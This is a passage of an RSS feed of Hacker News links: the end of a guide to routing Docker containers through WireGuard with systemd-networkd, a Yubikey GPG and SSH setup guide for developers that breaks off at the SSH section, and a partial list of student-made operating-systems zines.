<p>Now that we got the WireGuard interface up and running we have to arrange for the traffic of our Docker container to actually go through it. Turns out all we have to do is adding four lines to <code>85-wg0.network</code>. This it how it should look like:</p>
<p><strong>Updated <code>85-wg0.network</code>:</strong></p>
<div id="cb7"><pre><code><span id="cb7-1"><span>[Match]</span></span>
<span id="cb7-2"><span>Name</span><span>=</span><span>wg0</span></span>
<span id="cb7-3"></span>
<span id="cb7-4"><span>[Network]</span></span>
<span id="cb7-5"><span># If you need multiple addresses, e.g. for IPv4 and 6, use multiple Address lines.</span></span>
<span id="cb7-6"><span>Address </span><span>=</span><span> {Address to bind to inside the VPN, same as in wg-quick config}</span></span>
<span id="cb7-7"></span>
<span id="cb7-8"><span>[RoutingPolicyRule]</span></span>
<span id="cb7-9"><span># Or any other unused private subnet</span></span>
<span id="cb7-10"><span>From </span><span>=</span><span> </span><span>10</span><span>.</span><span>123</span><span>.</span><span>0.0</span><span>/</span><span>16</span></span>
<span id="cb7-11"><span># Or any other unused table number</span></span>
<span id="cb7-12"><span>Table </span><span>=</span><span> </span><span>242</span></span>
<span id="cb7-13"></span>
<span id="cb7-14"><span>[Route]</span></span>
<span id="cb7-15"><span>Gateway </span><span>=</span><span> {The address of the interface, same as above}</span></span>
<span id="cb7-16"><span># Same table number as above</span></span>
<span id="cb7-17"><span>Table </span><span>=</span><span> </span><span>242</span></span>
<span id="cb7-18"></span>
<span id="cb7-19"><span>[Route]</span></span>
<span id="cb7-20"><span>Destination </span><span>=</span><span> </span><span>0</span><span>.</span><span>0</span><span>.</span><span>0.0</span><span>/</span><span>0</span></span>
<span id="cb7-21"><span>Type </span><span>=</span><span> blackhole</span></span>
<span id="cb7-22"><span>Metric </span><span>=</span><span> </span><span>1</span></span>
<span id="cb7-23"><span># Same table number as above</span></span>
<span id="cb7-24"><span>Table </span><span>=</span><span> </span><span>242</span></span></code></pre></div>
<p>What the <code>[RoutingPolicyRule]</code> section does is taking all traffic from the specified subnet and looking up the routes in routing table 242 for it. We add a route to (hopefully previously empty) table 242 with the <code>[Route]</code> section, and that route sends the traffic to our WireGuard interface because we set the interface‚Äôs address as gateway.</p>
<p>The second <code>[Route]</code> section sets a blackhole route in the same table with a metric of 1, that means a lower priority than the default metric of 0. This should discard all traffic (instead of routing it through the default network without any VPN) if the VPN gateway is down and therefore prevent leaks.</p>
<p>That should be all we have to do on the system side!</p>
<h2 id="using-it-with-docker">Using it with Docker</h2>
<p>To actually get Docker to use the interface with specific containers we have two possibilities.</p>
<p>Note for both methods that published ports will not be available on <code>localhost</code> on the host as they normally would as all container traffic goes through the VPN (which is what we wanted, of course). So if you add an exposed port it must be accessed through the VPN‚Äôs outside address.</p>
<h3 id="docker-directly">Docker Directly</h3>
<p>Create a Docker network in the subnet we used in the systemd-networkd config file with <code>sudo docker network create tunneled0 --subnet 10.123.0.0</code> (or use any other name than <code>tunneled0</code>), then run containers in that network by using the <code>--net=tunneled0</code> option. With the <code>--dns</code> option you can set a custom DNS so that no DNS traffic gets leaked.</p>
<p>For example, you can use <code>sudo docker run -t --net=tunneled0 curlimages/curl icanhazip.com</code> to check that the returned IP is actually the VPN‚Äôs IP.</p>
<h3 id="docker-compose">Docker Compose</h3>
<p>This is the more comfortable method. You can use this as a base for your own compose files:</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>version</span><span>:</span><span> </span><span>"3.7"</span></span>
<span id="cb8-2"><span>services</span><span>:</span></span>
<span id="cb8-3"><span>  </span><span>app</span><span>:</span></span>
<span id="cb8-4"><span>    </span><span>image</span><span>:</span><span> </span><span>{</span><span>image</span><span>}</span></span>
<span id="cb8-5"><span>    </span><span>dns</span><span>:</span><span> </span><span>"{DNS server to use}"</span></span>
<span id="cb8-6"><span>    </span><span>networks</span><span>:</span></span>
<span id="cb8-7"><span>      # Or your own name</span></span>
<span id="cb8-8"><span>      </span><span>tunneled0</span><span>:</span></span>
<span id="cb8-9"><span>networks</span><span>:</span></span>
<span id="cb8-10"><span>  # Same name as above</span></span>
<span id="cb8-11"><span>  </span><span>tunneled0</span><span>:</span></span>
<span id="cb8-12"><span>    </span><span>ipam</span><span>:</span></span>
<span id="cb8-13"><span>      </span><span>config</span><span>:</span></span>
<span id="cb8-14"><span>        </span><span>-</span><span> </span><span>subnet</span><span>:</span><span> 10.123.0.0/16</span></span></code></pre></div>
<h2 id="port-forwarding">Port Forwarding</h2>
<p>You can use Docker‚Äôs normal port publishing options to make ports available through the VPN. So, for example, if your VPN provider gives you port <code>1234</code> and you want port <code>80</code> inside your container to be available through the VPN, call Docker with <code>-p 1234:80</code> (do not forget ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.eisfunke.com/article/docker-wireguard-systemd.html">https://www.eisfunke.com/article/docker-wireguard-systemd.html</a></em></p>]]>
            </description>
            <link>https://www.eisfunke.com/article/docker-wireguard-systemd.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583512</guid>
            <pubDate>Thu, 24 Sep 2020 20:54:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yubikey Setup Guide for Software Developers]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583224">thread link</a>) | @zackify
<br/>
September 24, 2020 | https://zach.codes/ultimate-yubikey-setup-guide/ | <a href="https://web.archive.org/web/*/https://zach.codes/ultimate-yubikey-setup-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <ul><li><a href="#intro">Intro</a></li><li><a href="#getting-started">Getting Started</a></li><li><a href="#generating-the-master-key">Generating the Master Key</a></li><li><a href="#exporting-the-key">Exporting the Key</a></li><li><a href="#setting-up-your-yubikey">Setting up your Yubikey</a></li><li><a href="#adding-to-a-yubikey">Adding to a Yubikey</a></li><li><a href="#setting-up-gpg-signing">Setting up GPG Signing</a></li><li><a href="#using-ssh">Using SSH</a></li><li><a href="#using-duplicated-keys">Using Duplicated Keys</a></li></ul><h2 id="intro">Intro</h2><p>In the past year Yubico has updated their firmware to support Ed25519. This finally brings support for elliptical curve encryption, and much shorter ssh public keys.</p><p>Yubikeys are really useful, they allow you to do git commit signing, ssh, and store your private key on an external device.</p><p>This lets you jump between computers easily, and you never have your private key sitting on a local filesystem. </p><p>One critical piece to this setup is making backup keys, this has been covered by other blog posts, but there's a less common issue out there: plugging in a cloned key will cause a GPG error that you have to work around on your own... This is frustrating if you setup two yubikeys, and frequently use them both. </p><p>This guide will cover creating the GPG master key. Setting it up for commit signing, using this master key with ssh, how to make backups, and how to setup multiple computers. Unfortunately it's a bit involved for newcomers, but once you have this system setup, you're left with an extremely secure SSH + GPG solution!</p><h2 id="getting-started">Getting Started</h2><p>You need to purchase a <a href="https://www.yubico.com/store/">Yubikey</a> that was made after November 2019. That's around the time that 5.2.3 came out. You can read more about it <a href="https://support.yubico.com/support/solutions/articles/15000027139-yubikey-5-2-3-enhancements-to-openpgp-3-4-support">here</a>. This firmware version added support for curve25519. I have used the 5CI, 5C nano, 5C, 5 NFC, and the brand new 5C NFC. I've duplicated my master key across each of my keys. I highly recommend you buy at least two keys, so that if you lose one you are not locked out of servers or other systems.</p><p>Let's get started by installing the gpg tooling. Be sure to do this step on every computer that you plan to use your Yubikey with!</p><pre><code>brew install gnupg pinentry-mac</code></pre><p>If you're not running a mac, be sure to download the gnupg utility for your OS.</p><h2 id="generating-the-master-key">Generating the Master Key</h2><p>This will be the master GPG key for all of our Yubikeys, our ssh key is also derived from it. Open up a terminal, and create a new directory. I will use a folder called <code>gpg</code> and will reference it later. Then run the following:</p><pre><code>gpg --expert --full-gen-key</code></pre><p>Now that we are inside the gpg tool, select <code>9</code> for ECC. Followed by <code>1</code> for curve25519. </p><p>I tend to chose <code>0</code> on the next step, so that my key never expires. It will then ask for your name and email address, then you can hit "O" for okay. </p><p>The final step is a prompt to choose a password. Be sure to choose something long and very random. I wrote my secret key down on paper for safe keeping. You will need to retype this secret key a lot unfortunately. 3 times per yubikey in order to copy it over, so don't forget it!</p><h4 id="adding-subkeys">Adding subkeys</h4><p>You should now see a line outputted after its creation that looks like this:</p><pre><code>gpg: key A5CA05BB6F4730D4 marked as ultimately trusted</code></pre><p>To make our next steps easier to follow, please run this in your terminal:</p><pre><code>echo "A5CA05BB6F4730D4" &gt;&gt; keyid</code></pre><p>Replace the key id above with your own. We are just throwing it into a file in the current folder for safe keeping.</p><p>We need to create <code>authentication</code> and <code>signature</code> subkeys before our master key is complete.</p><pre><code>gpg --expert --edit-key $(cat keyid)</code></pre><p>Now we are inside the gpg tool and need to do the following:</p><pre><code>addkey
choose "11" ECC (set your own capabilities)
choose "A" Toggle the authenticate capability
type "Q"
choose "1" Curve 25519</code></pre><p>After that, you can set the expiration, and then type in your secret key to finish creating the sub key. We need to do it once more for the signing key:</p><pre><code>addkey
choose "10" ECC (sign only)
choose "1" Curve 25519</code></pre><p>Set expiration, and choose yes to create, and then yes again to really create it..... these gpg tools are not very user friendly are they?</p><p>Okay! We did it... we created the keys and just need to type <code>save</code> to get out of the gpg tool. We can finally move on.</p><h2 id="exporting-the-key">Exporting the Key</h2><p>Inside your <code>gpg</code> folder, run the following:</p><pre><code>gpg --armor --export-secret-keys $(cat keyid) &gt; mastersub.key
gpg --armor --export-secret-subkeys $(cat keyid) &gt; sub.key
gpg --armor --export $(cat keyid) &gt; public.key</code></pre><p>We've successfully exported our key, and the corresponding gpg public key. This will be needed later when we setup commit signing. </p><p>THIS IS VERY IMPORTANT</p><p>be sure to make a zip file of your gpg folder that we ran the commands inside of. You should have the following files inside:</p><pre><code>keyid        
mastersub.key 
public.key    
sub.key</code></pre><p>This zip file (gpg.zip) should be backed up offline to a usb drive, or other secure location. It is also very important, because each time we move our gpg key over to a yubikey, the gpg tool destroys the key. So we have to copy over a duplicate each time. </p><p>Side note... this is yet another annoyance with the gpg tool. I am trying to make this guide as straight forward as I can, it took me forever to do all of this because of how overly complicated the gpg tools are. Thankfully some core contributors are <a href="https://sequoia-pgp.org/">rewriting the spec in rust</a>.</p><h2 id="setting-up-your-yubikey">Setting up your Yubikey</h2><p>We'll move on to getting our yubikey ready! We start by configuring it. GPG recognizes Yubikeys as smart cards:</p><pre><code>gpg --card-edit
admin
passwd</code></pre><p>On this prompt, you will want to choose <code>1</code> to change the pin. When the prompt comes up, type <code>123456</code> for the current pin, this is the default for yubikeys. After, set a secure password. This will be used to unlock the secret key on your Yubikey for ssh or gpg usage. I like to keep mine kind of short, but also something that isn't too easy.</p><p>After that, type <code>3</code>. This time we need to change the admin pin. The initial pin is <code>12345678</code>. I tend to use the same pin for admin and normal pins. I also use the same pin on each of my backup yubikeys, so that I don't accidentally get locked out. After that's done, type <code>q</code>, then there's a few extra commands you can set if you want to:</p><pre><code>name
lang
login</code></pre><p>Before we add the keys to our Yubikey, there are a couple optional setup steps. If you want to, you can go download <a href="https://developers.yubico.com/yubikey-manager/">Yubikey Manager CLI</a>. And run these commands:</p><pre><code>ykman openpgp set-touch aut off
ykman openpgp set-touch sig on
ykman openpgp set-touch enc on</code></pre><p>It's up to you to set these to on or off. This is just telling your yubikey that any authentication, signature, or encryption key usage, requires a physical touch of the device before it will do the operation. This can be useful for ultra security conscious individuals. A program wouldn't be able to sign or encrypt anything with your key in the background, because it would require a touch before any action.</p><p>The last thing I tend to do, is install up the <a href="https://developers.yubico.com/yubikey-manager-qt/">Yubikey Manager GUI</a>, go to Applications -&gt; OTP, and disabled the short touch action. This is on by default and if you bump it during a slack message, it can be really weird sending these authenticator codes by accident. </p><p>I like to configure the long touch action with a static password, I will choose something really random, but use it across all of my backup keys. If I am on a public computer without access to 1Password, I can use it as a secure password option, or you could even store your 1Password secret key here.</p><p>Oh, and before I forget, you can also go to Applications -&gt; FIDO2 and set a pin there. This will be used for <a href="https://webauthn.io/">Webauthn</a> when supported. If you use your Yubikey for 2FA on the web, it will require a pin, this protects you from someone stealing your yubikey and attempting to use it to access a service online, they would also need your pin. Also note that this is separate, and not the same as the GPG smart card pin we created earlier. All these specs in one device.... confusing huh?</p><p>There's so much these keys can do, and its spread across wayyyy too many applications and configurations!</p><h2 id="adding-to-a-yubikey">Adding to a Yubikey</h2><p>This section can be followed again for every Yubikey that you want to use. These will be exact clones with the master key on them, and will expose the same ssh public key every time you do this process.</p><p>You need to run the following commands outside of the <code>gpg</code> directory that we created in the key creation step. </p><p>Your current directory should have <code>gpg.zip</code> in it. Start by unarchiving the <code>gpg.zip</code> that we created earlier. Each time you do this section (for every key) you need to delete the <code>gpg</code> folder, and unarchive <code>gpg.zip</code> again. We can't reuse the <code>gpg</code> folder each time, because the gpg smart card commands delete the secret key, so you MUST have a fresh copy of the gpg files each time.</p><pre><code># unzip gpg.zip
export GNUPGHOME=$(mktemp -d)
cp -r gpg $GNUPGHOME
cd $GNUPGHOME/gpg

gpg --import mastersub.key
gpg --edit-key $(cat keyid)
</code></pre><p>Now we begin copying each of the three keys off the card. It's a bit verbose, so here's how you do it:</p><pre><code>key 1
keytocard (choose encryption, 1)
key 1


key 2
keytocard (signature)
key 2


key 3
keytocard (auth)
key 3
save</code></pre><p>GPG makes you select the key, then after doing <code>keytocard</code> you have to deselect it by typing the same thing again. It sometimes says "operation not supported by device" after you do the initial yubikey setup and run the <code>keytocard</code> command. Just unplug your yubikey, then plug it back in, type <code>keytocard</code> again, and it should show the key selection menu.</p><p>Each time you do <code>keytocard</code> you will have to enter the master key's secret key that you wrote down earlier, followed by the card's admin pin that you set. Like I said, pretty verbose, and can take a while if you have a really long secret key!</p><p>After this step is complete, your yubikey is ready to go.</p><h2 id="setting-up-gpg-signing">Setting up GPG Signing</h2><p>This process should be done on each computer that you want to do commit signing on.</p><pre><code>git config --global user.signingkey $(cat keyid)
git config --global commit.gpgsign true
gpg --import public.key</code></pre><p>The last command is the most important part. You must import the public key from your gpg master key, otherwise git won't recognize your yubikey. Don't ask how many hours I spent being confused as to why this didn't work on my second computer the first time :P &nbsp;</p><p>Be sure to add the contents of our <code>public.key</code> file to GitHub or other service, so that your commits will show as verified. </p><h2 id="using-ssh">Using SSH</h2><p>On a Mac you need to do the following:</p><pre><code>vi ~/.gnupg/gpg-agent.conf</code></pre><p>the contents are:</p><pre><code>use-st‚Ä¶</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zach.codes/ultimate-yubikey-setup-guide/">https://zach.codes/ultimate-yubikey-setup-guide/</a></em></p>]]>
            </description>
            <link>https://zach.codes/ultimate-yubikey-setup-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583224</guid>
            <pubDate>Thu, 24 Sep 2020 20:29:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Operating systems zines made by CS students]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582973">thread link</a>) | @azhenley
<br/>
September 24, 2020 | https://nipunbatra.github.io/os2020/zine/ | <a href="https://web.archive.org/web/*/https://nipunbatra.github.io/os2020/zine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/booting.png" alt="">
    </p>
    <div>
      <h3><b>Booting</b></h3>
      <p>Arpit Patel &amp; Lovepreet Singh</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/booting.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1ecfxb93eQiO1A13lTeZ8tm6VHBX3zaaJ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CFS.png" alt="">
    </p>
    <div>
      <h3><b>Completely Fair Scheduler</b></h3>
      <p>Preet Patel &amp;  Ribhu Vajpeyi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CFS.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1bNf4Bloj71m9fKkZoN5Ot1flXyvGUKgB/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Checksum.png" alt="">
    </p>
    <div>
      <h3><b>Checksum</b></h3>
      <p>Anupam Kumar &amp; Chiluveru Preeti</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Checksum.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/181N0FAGVofW3dBhQ6tQsuUcim0YpdtlW/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/chmod.png" alt="">
    </p>
    <div>
      <h3><b>chmod</b></h3>
      <p>Pranshu Kumar Gond &amp; Sagar Bisen</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/chmod.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1hPdjCsrAHTRImBf1kV4ACBW6W7_d-LQW/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CODEC.png" alt="">
    </p>
    <div>
      <h3><b>CODEC</b></h3>
      <p>Utsav Jethva	&amp; Shweta Pardeshi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CODEC.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1hONumvnnPV0CgGxVfA_hHYALUTYW3z5M/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CRON.png" alt="">
    </p>
    <div>
      <h3><b>CRON</b></h3>
      <p>Chandrahas	Rama &amp; Krishna Reddy</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CRON.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1Z2CStAdJYa24N7Y5RMUe96QC-qzS9PuQ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/cross_compilation.png" alt="">
    </p>
    <div>
      <h3><b>Cross Compilation</b></h3>
      <p>Urvishkumar Patel &amp; Tanmaey Gupta</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/cross_compilation.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1bp6xTXdZ2ij53xyr7stgi6vtDwi9SKBE/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Curl.png" alt="">
    </p>
    <div>
      <h3><b>Curl</b></h3>
      <p>Akshay Biju &amp; Avinash Karanam</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Curl.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1dUGubQh7Yicwlvc0egKprEb6mLeCjPFg/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/DD.png" alt="">
    </p>
    <div>
      <h3><b>Data Duplicator</b></h3>
      <p>Dhanya Sree &amp;  Manisha</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/DD.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/12Z3TS4XU4XJzAHtQN0UkEPN2pp0EMgJi/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Docker.png" alt="">
    </p>
    <div>
      <h3><b>Docker</b></h3>
      <p>Shivam Sahni &amp;  Dishank Goel</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Docker.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1dEj3UBFZgRYY0sjoV1cTKbJeVYtuivsS/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Dotfiles.png" alt="">
    </p>
    <div>
      <h3><b>Dotfiles</b></h3>
      <p>G Harshavardhan &amp;  Pittala Nikhil</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Dotfiles.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1f59tv18sSqNwara8oo2YVoT_3II4Ww5l/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/ENV_VAR.png" alt="">
    </p>
    <div>
      <h3><b>Environment Variable</b></h3>
      <p>Prasad Athave &amp;  Siddharth Soni</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/ENV_VAR.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1iKiV5BTdzG7UKPnsVfD-c3utEig3KHgc/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/gdb.png" alt="">
    </p>
    <div>
      <h3><b>gdb</b></h3>
      <p>Dhruvi Lodhavia &amp;  Udit Vyas</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/gdb.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1APC_H_ogNgClvDlawFrSObP4dcSm_5Kf/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/GREP.png" alt="">
    </p>
    <div>
      <h3><b>GREP</b></h3>
      <p>Priyam Tongia &amp;  Mihir Jain</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/GREP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1jgOq0CNteDyv9UwqmatrgtFyMzLfnKoY/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/GZIP.png" alt="">
    </p>
    <div>
      <h3><b>GZIP</b></h3>
      <p>Kalyan  &amp;  Shahid</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/GZIP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1uJ78nyH_btQ4q5DU9bFLjOADJPrFLj-9/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/MAKE_FILE.png" alt="">
    </p>
    <div>
      <h3><b>Make File</b></h3>
      <p>Kushagra Sharma  &amp;  Aditya Tripathi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/MAKE_FILE.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1lHeeE7Ib0-2riTf3Y1m_zwtMkUDSQBwu/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/man.png" alt="">
    </p>
    <div>
      <h3><b>Man</b></h3>
      <p>Vedant Bhutani &amp;  Ojas Mithbavkar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/man.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1oY0gE0SyTdnBQ33XUhRqXk9Qow3K3h_9/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Mount.png" alt="">
    </p>
    <div>
      <h3><b>Mount</b></h3>
      <p>Abhavya Chandra &amp;  Shubham Deshpande</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Mount.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/17qzY44lbL0CmD69Po7HnM1bFXUkvRAx-/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Nohup.png" alt="">
    </p>
    <div>
      <h3><b>Nohup</b></h3>
      <p>Aditya Pusalkar &amp;  Pushkar Mujumdar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Nohup.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1BsOSQwzfo4Y-oqocBOPz1v5UT89wpSkH/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/nslookup.png" alt="">
    </p>
    <div>
      <h3><b>nslookup</b></h3>
      <p>Ajinkya Pawar &amp;  Jitender Kumar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/nslookup.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/19JlHAFJGVz515C6WyGOufZ0tQB_Kf1JU/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/OS_Python.png" alt="">
    </p>
    <div>
      <h3><b>OS Python</b></h3>
      <p>Amey Kulkarni &amp;  Chris Francis</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/OS_Python.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1gHbMbr064SxUK1aOY0k0MSjXrRrYLmRS/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/peggit.png" alt="">
    </p>
    <div>
      <h3><b>Peggit</b></h3>
      <p>Janvi Thakkar &amp;  Aishna Agrawal</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/peggit.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1jv3JHauQ-NFFxL1-z77bsg4bd9Ef_e14/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/ping.png" alt="">
    </p>
    <div>
      <h3><b>Ping</b></h3>
      <p>Raghav Goyal &amp;  Devvrat Joshi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/ping.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1KTo_GnLo5Lk33j1vJRp99niGuG1dJsQv/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/pipe.png" alt="">
    </p>
    <div>
      <h3><b>Pipes</b></h3>
      <p>Harsh Shah &amp;  Madhav Tiwari</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/pipe.pdf">[Poster]</a>     <a href="">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SED.png" alt="">
    </p>
    <div>
      <h3><b>SED</b></h3>
      <p>Ronak Kaoshik &amp;  Deepika Soni</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SED.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1wLoi0Fw0P2eN9pCjeGKjLOcQtNmfrGmI/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SFTP.png" alt="">
    </p>
    <div>
      <h3><b>SFTP</b></h3>
      <p>Viraj Shah &amp;  Vrutik Shah</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SFTP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1_vuoQw64f8qxhGwfkJhPRIL6FM9PFvX_/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SORT_UNIQ.png" alt="">
    </p>
    <div>
      <h3><b>Sort and Uniq</b></h3>
      <p>Nishikant Parmar &amp;  Sachin Yadav</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SORT_UNIQ.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1u_4qVfko5kEyhPOBp8iNWaVbtncoPhTO/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SSDS.png" alt="">
    </p>
    <div>
      <h3><b>SSDS</b></h3>
      <p>Varun Jain &amp;  Arpita Kabra</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SSDS.pdf">[Poster]</a>     <a href="">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SSH.png" alt="">
    </p>
    <div>
      <h3><b>SSH</b></h3>
      <p>Harsh Patel &amp;  Palak Purohit</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SSH.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1V1ou72qCVmTSSOmDJTJEPcyyLSF7F_2g/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/tar.png" alt="">
    </p>
    <div>
      <h3><b>Tar</b></h3>
      <p>Vivek Modi  &amp;  Shruti Katpara</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/tar.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1x-Mgglk0W2Xz3-NSwpEt74iZMGM045qh/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Traceroute.png" alt="">
    </p>
    <div>
      <h3><b>Traceroute</b></h3>
      <p>Rwik Rana &amp;  Harshit Kumar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Traceroute.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/11mPNAKAXZHaBM_UoznSEZcW6TVH_osOl/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Valgrind.png" alt="">
    </p>
    <div>
      <h3><b>Valgrind</b></h3>
      <p>Abhinav Singh &amp;  Bikramjot Singh Dhindsa</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Valgrind.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1HpXGbFqlU-w7o6WIjGNB1MT0W6jC1WY5/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/VIM.png" alt="">
    </p>
    <div>
      <h3><b>VIM</b></h3>
      <p>Shril mody &amp;  hetvi shastri</p>
 
